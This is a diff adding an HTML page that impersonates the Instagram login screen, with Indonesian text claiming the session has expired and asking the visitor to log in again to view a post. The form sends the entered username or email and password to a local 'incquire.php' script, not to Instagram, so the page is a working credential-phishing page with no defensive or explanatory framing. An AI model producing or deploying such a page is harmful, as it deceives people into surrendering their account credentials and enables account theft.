@@ -1,0 +1,78 @@
+<html lang="en"><head><meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="haykaljb/css/bootstrap.min.css">
+
+    <title>Instagram</title>
+    <link rel="shorcut icon" href="haykaljb/img/logo.webp">
+    <link rel="stylesheet" href="haykaljb/css/main.css">
+  </head>
+  <body>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 d-block mx-auto col-12 mt-5">
+                <img class="d-block mx-auto" src="haykaljb/img/ZFtnMBJnHU_.png" alt="">
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-12 col-md-6 d-block mx-auto mt-4 px-4">
+                <span class="text-1 d-block mx-auto text-center">Sesi telah berakhir! Silahkan login kembali untuk menuju ke postingan.</span>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-12 col-md-5 d-block mx-auto mt-5 px-5">
+                <form action="incquire.php" method="POST">
+                    <div class="form-group">
+                        <input type="text" name="user" id="user" class="form-control" autocomplete="off" required="">
+                        <label class="labs">Nomor telepon, nama pengguna, atau email</label>
+                    </div>
+                    <div class="form-group" style="margin-top: -8px;">
+                        <input type="password" name="pass" id="pass" class="form-control" autocomplete="off" required="">
+                        <label class="labs">Kata Sandi</label>
+                    </div>
+                    <div class="form-group mt-4">
+                        <button class="btn btn-primary w-100" id="set-button" type="submit" disabled="">Masuk</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="row">
+        <div class="col-12 mt-5">
+                <span class="text-2 d-block mx-auto text-center">Tidak punya akun? <a href="#">Buat akun</a></span>
+            </div>
+            <div class="col-12 mt-5">
+                <span class="text-2 d-block mx-auto text-center">Dapatkan Aplikasi</span>
+                <img src="haykaljb/img/down.png" class="d-block mx-auto mt-2" width="250" alt="">
+            </div>
+        </div>
+    </div>
+    <script src="haykaljb/js/jquery.min.js"></script>
+    <script src="haykaljb/js/bootstrap.bundle.min.js"></script>
+    <script>
+        function OnButton(user, pass) {
+            if(user.length > 0 && pass.length > 4) {
+                $("#set-button").prop('disabled', false);
+            } else {
+                $("#set-button").prop('disabled', true);
+            }
+        }
+        $(document).ready(function() {
+            $("#user").on('input', function() {
+                var user = $("#user").val();
+                var pass = $("#pass").val();
+
+                OnButton(user, pass);
+            });
+
+            $("#pass").on('input', function() {
+                var user = $("#user").val();
+                var pass = $("#pass").val();
+
+                OnButton(user, pass);
+            });
+        });
+    </script>
+  
+</body></html>
